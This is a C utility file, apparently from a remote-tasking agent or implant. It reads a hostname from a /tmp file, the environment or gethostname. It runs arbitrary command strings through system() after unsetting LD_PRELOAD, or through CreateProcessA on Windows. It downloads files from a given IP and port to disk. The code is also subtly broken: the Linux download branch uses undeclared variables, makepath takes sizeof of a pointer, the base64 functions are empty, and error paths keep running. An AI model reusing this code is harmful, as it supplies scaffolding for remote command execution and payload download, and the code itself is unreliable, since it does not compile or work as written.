#include "utils.h"

char ME[100]; //This is where the hostname will be stored

bool file_exists(char *filename)
{
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

char *getmyhostname()
{
    return ME;
}

void setmyhostname()
{
    char inbuff[1024];
    FILE *fh;

    // open the file in temp first
    if (file_exists("/tmp/X9999-host"))
    { // Connect to socket and write to file
        fh = fopen("/tmp/X9999-host", "r");

        if (fh == NULL)
        {
#ifdef TESTING
            printf("Failed to open the hostname file\n");
#endif
        }
        else
        {
#ifdef TESTING
            printf("hostname File opened ok.  Reading\n");
#endif

            fgets(inbuff, sizeof(inbuff), fh);
            if (inbuff[strlen(inbuff) - 1] == '\n')
            {
                inbuff[strlen(inbuff) - 1] = '\0';
            }

            fclose(fh);
#ifdef TESTING
            printf("Parsed Hostname :%s:\n", inbuff);
#endif
            strncpy(ME, inbuff, 99);
            return;
        }
    }
#ifdef TESTING
    printf("Didn't get it from X9999-host file\n");
#endif
    // if not possible check environment variable
    //  on windows set varname=value
    char *temp = getenv("HOSTNAME");
    if (temp != NULL)
    {
#ifdef TESTING
        printf("Environment var hostname:%s:\n", temp);
#endif
        strncpy(ME, temp, 99);
        return;
    }
#ifdef TESTING
    printf("Didn't get it from environment\n");
#endif
    // if not there use localhostname.
    if (gethostname(inbuff, 1024) == 0)
    { // Brilliant 0 is success on this one :(

        strncpy(ME, inbuff, 99);

#ifdef TESTING
        printf("Defaulting to own hostname :%s:\n", inbuff);
#endif
        return;
    }

    printf("Didn't get it from localhostname\n");
    sprintf(ME, "dunno"); // Unsafe but good enough
}

/* Runtask For Windows
void runtask(char *task) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
}
*/


/* Runtask for Linux */
void runtask(char *task)
{
#ifdef LINUX_VERSION
    unsetenv("LD_PRELOAD");
    system(task);
#endif
#ifdef WINDOWS_VERSION
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
#endif
}

void makepath(char* dest, int destlen, char* front, char* back) {
  _snprintf(dest, sizeof(dest), "%s%s", front, back);

}


int get_content_length(char *response)
{
    char *start, *end;
    char content_len_str[100]; // content length won't be longer than 100 characters
    int len;

    start = strstr(response, "Content-Length: ");
    if (start == NULL)
    {
        return -1;
    }
    start += 16;
    end = start;
    while (*end && isdigit(*end))
    {
        end++;
    }
    len = end - start;
    strncpy(content_len_str, start, len);

    content_len_str[len] = '\0';
#ifdef TESTING
    printf("Content-Length: %s\n", content_len_str);
#endif

    return atoi(content_len_str);
}

void base64encode(char **in, char **out)
{
}

void base64decode(char **in, char **out)
{
}

void webrequest(char* ip, int port, char* torequest, char* outpath) {

#ifdef WINDOWS_VERSION
    char portstring[10]; 

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    int iResult;
    int recvbuflen = 1024;
    char request[1300];
    char inbuff[1024];
    FILE* fh;

    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port (Why PORT IN getaddrinfo... dumb)
    snprintf(portstring, 10, "%d", port);
    iResult = getaddrinfo(ip, portstring, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    }
    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        sock = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }

        // Connect to server.
        iResult = connect( sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }
    
    freeaddrinfo(result);

    if (iResult < 0)
    {
#ifdef TESTING
        printf("Socket Error\n");
#endif
        closesocket(sock);
    }
    else
    {
        // Send request
        _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
        iResult = send(sock, request, strlen(request), 0);

        Sleep(1);
        int tmp = recv(sock, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.

        // Find the Content-Length
        int toread = get_content_length(inbuff);
        if (toread == -1)
        {
#ifdef TESTING
            printf("didn't find content-length\n");
#endif
            closesocket(sock);
            return;
        }

        unlink(outpath); // Delete if already exists
        fh = fopen(outpath, "w");

        int sofar = 0;

        char *start = strstr(inbuff, "\r\n\r\n");
        if (start == NULL)
        {
#ifdef TESTING
            printf("Couldn't find the boundary between response and body\n");
#endif
            return;
        }
        start += 4; // Get past the \r\n\r\n
        int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;

        int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
#ifdef TESTING
        printf("Wrote %d bytes\n", tmp2);
#endif
        sofar = tmp2;

        while (sofar < toread)
        {
            Sleep(1); // This may be too long for effective comms.
            tmp = recv(sock, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
            printf("Received %d bytes\n", tmp);
#endif
        sofar += tmp;

        if (tmp > 0)
        {
            tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
        }
    }
#ifdef TESTING
    printf("Done writing, closing file");
#endif
    fclose(fh);
    closesocket(sock);
    WSACleanup();
}
#endif

#ifdef LINUX_VERSION
    int sockfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        {
#ifdef TESTING
            printf("Error opening socket\n");
#endif
        }
        // bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = inet_addr(ip);
        servaddr.sin_port = htons(port);

        int tmp = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

        if (tmp < 0)
        {
#ifdef TESTING
            printf("Socket Error\n");
#endif
            close(sockfd);
        }
        else
        {
        // Send request
            _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
            send(sockfd, request, strlen(request), 0);

            sleep(1);
            int tmp = recv(sockfd, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.

            // Find the Content-Length
            int toread = get_content_length(inbuff);
            if (toread == -1)
            {
#ifdef TESTING
                printf("didn't find content-length\n");
#endif
            }

            unlink(outpath); // Delete if already exists
            fh = fopen(outpath, "w");

            int sofar = 0;

            char *start = strstr(inbuff, "\r\n\r\n");
            if (start == NULL)
            {
#ifdef TESTING
                printf("Couldn't find the boundary between response and body\n");
#endif
            }
            start += 4; // Get past the \r\n\r\n
            int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;

            int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
            sofar = tmp2;

            while (sofar < toread)
            {
                sleep(1); // This may be too long for effective comms.
                tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
                printf("Received %d bytes\n", tmp);
#endif
                sofar += tmp;

                if (tmp > 0)
                {
                    tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
                    printf("Wrote %d bytes\n", tmp2);
#endif
                }
            }
#ifdef TESTING
            printf("Done writing, closing file");
#endif
            fclose(fh);
        }
#endif
}
